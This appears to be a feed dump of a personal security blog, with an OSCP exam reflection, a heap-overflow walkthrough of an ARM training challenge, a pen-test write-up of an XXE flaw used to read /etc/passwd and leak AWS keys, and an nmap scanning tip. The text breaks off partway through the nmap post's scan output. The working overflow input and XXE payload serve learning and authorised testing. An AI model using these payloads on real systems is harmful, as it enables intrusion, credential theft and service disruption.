&lt;h2 id=&quot;a-quick-breakdown&quot;&gt;A quick breakdown&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Lab time purchased:&lt;/strong&gt; 90 days&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Started:&lt;/strong&gt; March 2018&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exam:&lt;/strong&gt; End of May 2018&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exam Attempts:&lt;/strong&gt; 1&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Additional:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Completed the lab report as soon as I could (possibility for extra marks)&lt;/li&gt;
  &lt;li&gt;Spent ~2 hours a day chipping away due to work and University&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;before-my-lab-time&quot;&gt;Before my lab time&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Started from scratch** on Hack the Box (HTB), and just about reached the ‘Pro Hacker’ rank.&lt;/li&gt;
  &lt;li&gt;I’d been to 1 face to face CTF which I was terrible at.&lt;/li&gt;
  &lt;li&gt;I had dabbled with very basic Buffer Overflows (no ROP, Ret2LibC, Canaries, DEP, ASLR etc).&lt;/li&gt;
  &lt;li&gt;Had very limited knowledge of web exploitation (xss, no sqli).&lt;/li&gt;
  &lt;li&gt;Awful at enumeration (pre and post), I successfully missed obvious things a lot.&lt;/li&gt;
  &lt;li&gt;I thought long sessions of hacking and energy drinks were a good idea.&lt;/li&gt;
  &lt;li&gt;I knew C, a bit of Python, no bash, and my Kali (linux overall) skills were limited (I knew various other languages which were of no use here…)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;** When I say scratch… I mean scratch. I was googling how to ‘scan ports’ and ‘how to hack WordPress.’ I didn’t even know what a reverse shell was, I just knew I wanted to get one. Trust me, I was clueless.&lt;/p&gt;

&lt;h2 id=&quot;during-my-lab-time&quot;&gt;During my lab time&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Enumeration became the key to my lab success.&lt;/li&gt;
  &lt;li&gt;The PWK course material carried me through the lab.&lt;/li&gt;
  &lt;li&gt;I used the rubber duck approach with non-technical beings. I talked to my lizard, tarantula and girlfriend about various systems and my approach, receiving 0 feedback. This made me explain it further and further until the answer was literally on the tip of my tongue. (Great technique for debugging code too!)
*Metasploit wasn’t the only option (99.9% of the time).&lt;/li&gt;
  &lt;li&gt;C, Python, Bash and (minor) x86 asm is your friend.&lt;/li&gt;
  &lt;li&gt;The “try harder” attitude didn’t really help me, unless it’s used in a sense of “you’re at the right door, just keep trying”. When it’s some kid who can’t even sign up on HtB spamming it on discord, it’s just not worth reading it.&lt;/li&gt;
  &lt;li&gt;Custom cheat sheets for my own tools/scripts, enumeration methods and overflow techniques really helped relieve stress when it came to using them against a target.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;after-i-received-my-pass&quot;&gt;After I received my “pass”&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;A nice sleep during the exam was literally all I needed.&lt;/li&gt;
  &lt;li&gt;Enumeration WAS (and still is) the key to my “success”.&lt;/li&gt;
  &lt;li&gt;Energy drinks just increased palpitations, eat and drink healthier stuff throughout. Don’t enhance your stress!&lt;/li&gt;
  &lt;li&gt;I wasted time banging my head against something I thought was going to work. I even told myself it wasn’t going to work. I continued to hit it. Don’t do that.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;DON’T be put off by the Buffer Overflow content. It’s the best bit!&lt;/li&gt;
  &lt;li&gt;The course materials will take you from 0 to OSCP, it just takes time and effort.&lt;/li&gt;
  &lt;li&gt;The exam is difficult, and it should be ‘feared’ but don’t let it hinder your progression. If you fail, so what? Just re-book it, study up and hit it again.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Overall, enjoy it. It’s 24 hours of hacking (if you don’t sleep). OffSec care about their students, if you have any questions just ping them. I made heavy use of their live chat because I’m smart enough to literally break everything, all the time.
You’ll miss it when it’s over, I know I do. So make the most of it!&lt;/p&gt;

&lt;p&gt;Good luck if you are planning to take the course and exam yourself. It’s definitely worth the time and effort 🙂&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">I passed my OSCP in June 2018, so this post is a little late. But honestly, I figured everyone else writes one almost immediately, fuelled by the joy/sadness of receiving the email from OffSec. I did think about writing one straight away but I didn’t really know how it would differ to anyone else… “I passed. Exam was hard. Labs was fun. Well worth it. Woooooh.” So a few months down the line, I figured I could post some points about my personal experience with OffSec’s PWK course (and ultimately, the very popular OSCP certification). I don’t really want to sit here and recommend resources and pre-requisites for everyone to be able to one shot the exam. These kind of blogs can be found with a simple Google, infact – some people even dump an entire A-Z on Github, so I’m sure if you’re good enough at Google then you’ll find it. However, that’d ruin the whole experience (in my opinion). The following sections of this post contain 3 main topics “Before”, “During” and “After” my time with OffSec, what I learnt and any recommendations I have regarding the entire course and exam. Again, to reiterate – this won’t be a “Do this box on Vulnhub and you’ll pass”, it’s more of a holistic view of everything around gaining your OSCP certification. As well as these 3 main sections, I will break down my course purchase and conclude with any final thoughts. A quick breakdown Lab time purchased: 90 days Started: March 2018 Exam: End of May 2018 Exam Attempts: 1 Additional: Completed the lab report as soon as I could (possibility for extra marks) Spent ~2 hours a day chipping away due to work and University Before my lab time Started from scratch** on Hack the Box (HTB), and just about reached the ‘Pro Hacker’ rank. I’d been to 1 face to face CTF which I was terrible at. I had dabbled with very basic Buffer Overflows (no ROP, Ret2LibC, Canaries, DEP, ASLR etc). Had very limited knowledge of web exploitation (xss, no sqli). Awful at enumeration (pre and post), I successfully missed obvious things a lot. I thought long sessions of hacking and energy drinks were a good idea. I knew C, a bit of Python, no bash, and my Kali (linux overall) skills were limited (I knew various other languages which were of no use here…) ** When I say scratch… I mean scratch. I was googling how to ‘scan ports’ and ‘how to hack WordPress.’ I didn’t even know what a reverse shell was, I just knew I wanted to get one. Trust me, I was clueless. During my lab time Enumeration became the key to my lab success. The PWK course material carried me through the lab. I used the rubber duck approach with non-technical beings. I talked to my lizard, tarantula and girlfriend about various systems and my approach, receiving 0 feedback. This made me explain it further and further until the answer was literally on the tip of my tongue. (Great technique for debugging code too!) *Metasploit wasn’t the only option (99.9% of the time). C, Python, Bash and (minor) x86 asm is your friend. The “try harder” attitude didn’t really help me, unless it’s used in a sense of “you’re at the right door, just keep trying”. When it’s some kid who can’t even sign up on HtB spamming it on discord, it’s just not worth reading it. Custom cheat sheets for my own tools/scripts, enumeration methods and overflow techniques really helped relieve stress when it came to using them against a target. After I received my “pass” A nice sleep during the exam was literally all I needed. Enumeration WAS (and still is) the key to my “success”. Energy drinks just increased palpitations, eat and drink healthier stuff throughout. Don’t enhance your stress! I wasted time banging my head against something I thought was going to work. I even told myself it wasn’t going to work. I continued to hit it. Don’t do that. Final thoughts DON’T be put off by the Buffer Overflow content. It’s the best bit! The course materials will take you from 0 to OSCP, it just takes time and effort. The exam is difficult, and it should be ‘feared’ but don’t let it hinder your progression. If you fail, so what? Just re-book it, study up and hit it again. Overall, enjoy it. It’s 24 hours of hacking (if you don’t sleep). OffSec care about their students, if you have any questions just ping them. I made heavy use of their live chat because I’m smart enough to literally break everything, all the time. You’ll miss it when it’s over, I know I do. So make the most of it! Good luck if you are planning to take the course and exam yourself. It’s definitely worth the time and effort 🙂</summary></entry><entry><title type="html">Basic Heap Overflow</title><link href="http://localhost:4000/2019-02-24/basic_heap_overflow" rel="alternate" type="text/html" title="Basic Heap Overflow" /><published>2019-02-24T00:00:00+00:00</published><updated>2019-02-24T00:00:00+00:00</updated><id>http://localhost:4000/2019-02-24/basic_heap_overflow</id><content type="html" xml:base="http://localhost:4000/2019-02-24/basic_heap_overflow">&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
&lt;p&gt;I finally had some time to get back to Billy’s ARM exploitation challenges found on his &lt;a href=&quot;https://github.com/Billy-Ellis/Exploit-Challenges&quot;&gt;github&lt;/a&gt;. Until now, I have only really focused on the stack based vulnerabilities so I wanted to try some of his Heap based challenges. This post covers my approach to completing his ‘Heap Level 1’ challenge.&lt;/p&gt;

&lt;h2 id=&quot;the-challenge&quot;&gt;The Challenge:&lt;/h2&gt;
&lt;p&gt;The first Heap challenge that he released contained a very simple heap overflow vulnerability that allows the execution of a custom system command. The following output is produced from executing the binary:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Garys-iPhone:/lab/rop root# ./heaplevel1 
Usage: ./heaplevel1 &amp;lt;username&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From above, we can see that the binary takes a single argument; the username. Executing the binary with a specified username executes additional code and produces different output:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Garys-iPhone:/lab/rop root# ./heaplevel1 test
Welcome to heaplevel1, created by @bellis1000
User: test is executing command &quot;date&quot;
Sun Feb 24 01:48:27 GMT 2019
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;inspecting-the-binary&quot;&gt;Inspecting the Binary&lt;/h2&gt;
&lt;p&gt;To see what’s going on inside the binary, we can make use of a disassembler, for this step I used Hopper, but other tools will help accomplish the same.&lt;/p&gt;

&lt;p&gt;Looking at the following code, we can see there are two malloc functions. As this binary was compiled for the ARM architecture, we can picture the malloc() functions and the values used within their parameters.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;void *malloc(size_t size)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In ARM, the R1 register is used to hold the value of the first parameter of a function, so from the following code we can see that the value ‘0x80’ is moved into R1 before the malloc() function is called.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000be4c         movw       r1, #0x80
0000be50         str        r0, [sp, #0x30 + var_1C]
0000be54         mov        r0, r1
0000be58         bl         imp___symbolstub1__malloc
0000be5c         movw       r1, #0x80
0000be60         str        r0, [r7, #-0x10]
0000be64         mov        r0, r1
0000be68         bl         imp___symbolstub1__malloc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;0x80 in decimal is 128, so we know that both malloc calls pass the decimal value of 128 in as a parameter and allocate 128 bytes of heap memory.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;malloc(128);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Based on the two call’s occuring one after the other, both allocations will likely be next to each other within memory however we can dig deeper into this at runtime using GDB. Before we do this, there are a few more things we can do to help make our debugging a little smoother. The following list holds some points that we need to keep in mind whilst stepping through each instruction:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1st malloc() -&amp;gt; 0xbe58&lt;/li&gt;
  &lt;li&gt;2nd malloc() -&amp;gt; 0xbe68&lt;/li&gt;
  &lt;li&gt;1st strcpy() -&amp;gt; 0xbe80, loads ‘date’ system call into the 1st heap buffer&lt;/li&gt;
  &lt;li&gt;2nd strcpy() -&amp;gt; 0xbea0, loads the username into the 2nd heap buffer&lt;/li&gt;
  &lt;li&gt;printf() -&amp;gt; 0xbec4, prints the username and target system call to use&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;runtime-analysis&quot;&gt;Runtime analysis:&lt;/h2&gt;
&lt;p&gt;Breakpoint 0xbec4
Run to it, dump registers. See that r1 is the init’d string, r2 is the username and r3 is the system call.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) c
Continuing.
Welcome to heaplevel1, created by @bellis1000

Breakpoint 2, 0x0000bec4 in main ()
(gdb) i r
r0             0xbfbd	49085
r1             0x14b010	1355792
r2             0x14b090	1355920
r3             0x14b090	1355920
r4             0x0	0
r5             0x0	0
r6             0x0	0
r7             0x27dff758	668989272
r8             0x27dff75c	668989276
r9             0x3a80ce30	981519920
r10            0x0	0
r11            0x0	0
r12            0x14b091	1355921
sp             0x27dff728	668989224
lr             0x38a63ddf	950418911
pc             0xbec4	48836
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;View the addresses the r1, r2 and r3 to picture the printed output.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/w 0xbfbd
0xbfbd:  &quot;\033[36mUser: %s is executing command \&quot;%s\&quot;\n&quot;
(gdb) x/w 0x14b010
0x14b010:  'A' &amp;lt;repeats 128 times&amp;gt;
(gdb) x/2w 0x14b010
0x14b010:  'A' &amp;lt;repeats 128 times&amp;gt;
0x14b091:  &quot;ate&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Run it again with 128 A’s and 4 B’s.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Welcome to heaplevel1, created by @bellis1000
User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB is executing command &quot;BBBB&quot;
sh: BBBB: command not found
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We now know that the BBBB overwrites the value stored in the address that is used during the execution of the system command.
Minus the r2 addr from r3 addr == 128 bytes, proof that the heap allocs are next to each other.&lt;/p&gt;

&lt;p&gt;128 A’s with ‘whoami’ == overflow into code exec&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 2, 0x0000bec4 in main ()
(gdb) i r
r0             0xbfbd	49085
r1             0x155c20	1399840
r2             0x155ca0	1399968
r3             0x155ca0	1399968
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/10w 0x155c20
0x155c20:  'A' &amp;lt;repeats 128 times&amp;gt;, &quot;whoami&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) c
Continuing.
User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwhoami is executing command &quot;whoami&quot;
root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion-and-my-thoughts&quot;&gt;Conclusion and my thoughts:&lt;/h2&gt;

&lt;p&gt;I would be interested to hear feedback about this technique and whether or not there are further ways to increase the reliability of the results as well as maintaining the speed. Let me know your thoughts on twitter.&lt;/p&gt;

&lt;p&gt;Thanks for reading.&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Intro I finally had some time to get back to Billy’s ARM exploitation challenges found on his github. Until now, I have only really focused on the stack based vulnerabilities so I wanted to try some of his Heap based challenges. This post covers my approach to completing his ‘Heap Level 1’ challenge. The Challenge: The first Heap challenge that he released contained a very simple heap overflow vulnerability that allows the execution of a custom system command. The following output is produced from executing the binary: Garys-iPhone:/lab/rop root# ./heaplevel1 Usage: ./heaplevel1 &amp;lt;username&amp;gt; From above, we can see that the binary takes a single argument; the username. Executing the binary with a specified username executes additional code and produces different output: Garys-iPhone:/lab/rop root# ./heaplevel1 test Welcome to heaplevel1, created by @bellis1000 User: test is executing command &quot;date&quot; Sun Feb 24 01:48:27 GMT 2019 Inspecting the Binary To see what’s going on inside the binary, we can make use of a disassembler, for this step I used Hopper, but other tools will help accomplish the same. Looking at the following code, we can see there are two malloc functions. As this binary was compiled for the ARM architecture, we can picture the malloc() functions and the values used within their parameters. void *malloc(size_t size) In ARM, the R1 register is used to hold the value of the first parameter of a function, so from the following code we can see that the value ‘0x80’ is moved into R1 before the malloc() function is called. 0000be4c movw r1, #0x80 0000be50 str r0, [sp, #0x30 + var_1C] 0000be54 mov r0, r1 0000be58 bl imp___symbolstub1__malloc 0000be5c movw r1, #0x80 0000be60 str r0, [r7, #-0x10] 0000be64 mov r0, r1 0000be68 bl imp___symbolstub1__malloc 0x80 in decimal is 128, so we know that both malloc calls pass the decimal value of 128 in as a parameter and allocate 128 bytes of heap memory. malloc(128); Based on the two call’s occuring one after the other, both allocations will likely be next to each other within memory however we can dig deeper into this at runtime using GDB. Before we do this, there are a few more things we can do to help make our debugging a little smoother. The following list holds some points that we need to keep in mind whilst stepping through each instruction: 1st malloc() -&amp;gt; 0xbe58 2nd malloc() -&amp;gt; 0xbe68 1st strcpy() -&amp;gt; 0xbe80, loads ‘date’ system call into the 1st heap buffer 2nd strcpy() -&amp;gt; 0xbea0, loads the username into the 2nd heap buffer printf() -&amp;gt; 0xbec4, prints the username and target system call to use Runtime analysis: Breakpoint 0xbec4 Run to it, dump registers. See that r1 is the init’d string, r2 is the username and r3 is the system call. (gdb) c Continuing. Welcome to heaplevel1, created by @bellis1000 Breakpoint 2, 0x0000bec4 in main () (gdb) i r r0 0xbfbd 49085 r1 0x14b010 1355792 r2 0x14b090 1355920 r3 0x14b090 1355920 r4 0x0 0 r5 0x0 0 r6 0x0 0 r7 0x27dff758 668989272 r8 0x27dff75c 668989276 r9 0x3a80ce30 981519920 r10 0x0 0 r11 0x0 0 r12 0x14b091 1355921 sp 0x27dff728 668989224 lr 0x38a63ddf 950418911 pc 0xbec4 48836 View the addresses the r1, r2 and r3 to picture the printed output. (gdb) x/w 0xbfbd 0xbfbd: &quot;\033[36mUser: %s is executing command \&quot;%s\&quot;\n&quot; (gdb) x/w 0x14b010 0x14b010: 'A' &amp;lt;repeats 128 times&amp;gt; (gdb) x/2w 0x14b010 0x14b010: 'A' &amp;lt;repeats 128 times&amp;gt; 0x14b091: &quot;ate&quot; Run it again with 128 A’s and 4 B’s. Welcome to heaplevel1, created by @bellis1000 User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB is executing command &quot;BBBB&quot; sh: BBBB: command not found We now know that the BBBB overwrites the value stored in the address that is used during the execution of the system command. Minus the r2 addr from r3 addr == 128 bytes, proof that the heap allocs are next to each other. 128 A’s with ‘whoami’ == overflow into code exec Breakpoint 2, 0x0000bec4 in main () (gdb) i r r0 0xbfbd 49085 r1 0x155c20 1399840 r2 0x155ca0 1399968 r3 0x155ca0 1399968 (gdb) x/10w 0x155c20 0x155c20: 'A' &amp;lt;repeats 128 times&amp;gt;, &quot;whoami&quot; (gdb) c Continuing. User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwhoami is executing command &quot;whoami&quot; root Conclusion and my thoughts: I would be interested to hear feedback about this technique and whether or not there are further ways to increase the reliability of the results as well as maintaining the speed. Let me know your thoughts on twitter. Thanks for reading.</summary></entry><entry><title type="html">My first XXE in the wild</title><link href="http://localhost:4000/2018-11-11/first_wild_xxe" rel="alternate" type="text/html" title="My first XXE in the wild" /><published>2018-11-11T00:00:00+00:00</published><updated>2018-11-11T00:00:00+00:00</updated><id>http://localhost:4000/2018-11-11/first_wild_xxe</id><content type="html" xml:base="http://localhost:4000/2018-11-11/first_wild_xxe">&lt;p&gt;&lt;em&gt;Disclaimer: This information was found during a pen-test on a client. For that reason, my explanations and examples will be very vague and contain no sensitive information relative to the target but it will be kept close to the actual finding.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;If you’re not sure what XXE is, please refer to OWASP’s wiki page.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;initial-finding&quot;&gt;Initial finding&lt;/h2&gt;

&lt;p&gt;Whilst enumerating the target web app, various features were found that allowed authenticated users to upload their own data. An example of an XML template was obtainable via a download and presented the correct method of including custom data that the application could parse. As soon as I saw that XML was usable I started crafting small payloads just to test for XXE vulnerabilities.&lt;/p&gt;

&lt;p&gt;I initially tried to read a file with a name that definitely wouldn’t exist to see if I could leak any information about the target environment.&lt;/p&gt;

&lt;p&gt;The redacted XML file I used was:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE file [  
   &amp;lt;!ELEMENT file ANY &amp;gt;&lt;/span&gt;
    &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file://_definitely_doesnt_exist_asdfasdf&quot; &amp;gt;&lt;/span&gt;
  ]&amp;gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
    [Redacted fields]
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After uploading the crafted file, an error was printed within a field that would have been populated by the XML node field, proving my XXE payload had triggered and was returning data. The error was a ‘File Not Found’ error and included the whole file-path to the current location. Ultimately this information leak provided me with the following information:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;I was targeting a Linux environment&lt;/li&gt;
  &lt;li&gt;I had an XXE vulnerability to leverage&lt;/li&gt;
  &lt;li&gt;I effectively had RCE&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With these 3 points I was able to start leaking sensitive files such as /etc/passwd, configuration files and source code that would only normally be utilised by the server to help potentially find other weaknesses and issues within the target.&lt;/p&gt;

&lt;p&gt;What came next?
I crafted a short python script that performed the XXE vulnerable request over and over again. Each iteration attempted to obtain a different file from a dictionary I provided. Ultimately, I had created a brute force tool, similar to “dirbuster”, but specifically for enumerating the internal files and directories of my target. Using this quick tool lead to leaking the AWS secret keys… game over \o/&lt;/p&gt;

&lt;p&gt;The use of this tool probably wasn’t the most efficient approach, but it worked in this case. However, this accompanied by a ‘Billion Laughs’ attack lead to some issues for the client’s environment. Great news for the report though ;)&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Disclaimer: This information was found during a pen-test on a client. For that reason, my explanations and examples will be very vague and contain no sensitive information relative to the target but it will be kept close to the actual finding. If you’re not sure what XXE is, please refer to OWASP’s wiki page. Initial finding Whilst enumerating the target web app, various features were found that allowed authenticated users to upload their own data. An example of an XML template was obtainable via a download and presented the correct method of including custom data that the application could parse. As soon as I saw that XML was usable I started crafting small payloads just to test for XXE vulnerabilities. I initially tried to read a file with a name that definitely wouldn’t exist to see if I could leak any information about the target environment. The redacted XML file I used was: &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt; &amp;lt;!DOCTYPE file [ &amp;lt;!ELEMENT file ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &quot;file://_definitely_doesnt_exist_asdfasdf&quot; &amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; [Redacted fields] &amp;lt;/root&amp;gt; After uploading the crafted file, an error was printed within a field that would have been populated by the XML node field, proving my XXE payload had triggered and was returning data. The error was a ‘File Not Found’ error and included the whole file-path to the current location. Ultimately this information leak provided me with the following information: I was targeting a Linux environment I had an XXE vulnerability to leverage I effectively had RCE With these 3 points I was able to start leaking sensitive files such as /etc/passwd, configuration files and source code that would only normally be utilised by the server to help potentially find other weaknesses and issues within the target. What came next? I crafted a short python script that performed the XXE vulnerable request over and over again. Each iteration attempted to obtain a different file from a dictionary I provided. Ultimately, I had created a brute force tool, similar to “dirbuster”, but specifically for enumerating the internal files and directories of my target. Using this quick tool lead to leaking the AWS secret keys… game over \o/ The use of this tool probably wasn’t the most efficient approach, but it worked in this case. However, this accompanied by a ‘Billion Laughs’ attack lead to some issues for the client’s environment. Great news for the report though ;)</summary></entry><entry><title type="html">My go to full range scan</title><link href="http://localhost:4000/2018-06-01/my_go_to_port_scan" rel="alternate" type="text/html" title="My go to full range scan" /><published>2018-06-01T00:00:00+01:00</published><updated>2018-06-01T00:00:00+01:00</updated><id>http://localhost:4000/2018-06-01/my_go_to_port_scan</id><content type="html" xml:base="http://localhost:4000/2018-06-01/my_go_to_port_scan">&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
&lt;p&gt;Recently I have been using a specific scan for my initial checks on a target system. The method I use scans the entire range of ports on both the TCP and UDP channels. As it has helped me out so much, I thought I would share.&lt;/p&gt;

&lt;p&gt;Disclaimer: This technique is most likely known and used by many, but fingers crossed some viewers will find use for it! I have only ever performed this within CTF’s/lab environments, please be sure to understand your target environment before firing off scans blindly.&lt;/p&gt;

&lt;h2 id=&quot;the-command&quot;&gt;The command:&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -sU --min-rate 5000 --max-retries 1  -p- &amp;lt;target&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;arguments&quot;&gt;Arguments:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;-sT : TCP Connect() technique&lt;/li&gt;
  &lt;li&gt;-sU : enable UDP scanning&lt;/li&gt;
  &lt;li&gt;–min-rate : sets the slowest amount packets that can be sent each second&lt;/li&gt;
  &lt;li&gt;–max-retries : limits the number of port scan probe retransmissions&lt;/li&gt;
  &lt;li&gt;-p- : Specifies to scan the entire port range (1 to 65535)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To view all other possibilities, check out nmap’s man page.&lt;/p&gt;

&lt;h2 id=&quot;benefits&quot;&gt;Benefits:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Very quick scan&lt;/li&gt;
  &lt;li&gt;Probes every possible port on the target, not just the top 1000 common ports like other scans&lt;/li&gt;
  &lt;li&gt;Can help identify obscure ports that are being utilised by services&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;detriments&quot;&gt;Detriments:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Not the quiestest traffic (see below for test results)&lt;/li&gt;
  &lt;li&gt;Can produce results that misses a port that is found in another scan&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tests&quot;&gt;Tests:&lt;/h2&gt;

&lt;p&gt;In order to help understand one of the detriments I listed above, I wanted to perform a couple of nmap scans against a chosen target, on a safe network. I used iptables to gather the results. In order to make sure the traffic was gathered during a scan, I configured iptables using the following set of commands.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# iptables -I INPUT 1 -s 10.11.1.5 -j ACCEPT
root@kali:~/Documents# iptables -I OUTPUT 1 -d 10.11.1.5 -j ACCEPT
root@kali:~/Documents# iptables -Z
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The main focus of the tests was to gain an understanding of the amount of bytes that were sent across the network during a scan, relative to the time it took to complete and the ports that were found during a scan. I made sure to clear the obtained data before each different scan (-Z argument).&lt;/p&gt;

&lt;p&gt;Test 1:&lt;/p&gt;

&lt;p&gt;My chosen technique, scanning the entire port range across both TCP and UDP channels.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# nmap -sT -sU --min-rate 5000 --max-retries 1  -p- 10.11.1.5
Not shown: 61350 closed ports, 57737 filtered ports, 11980 open|filtered ports
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
135/udp open  msrpc
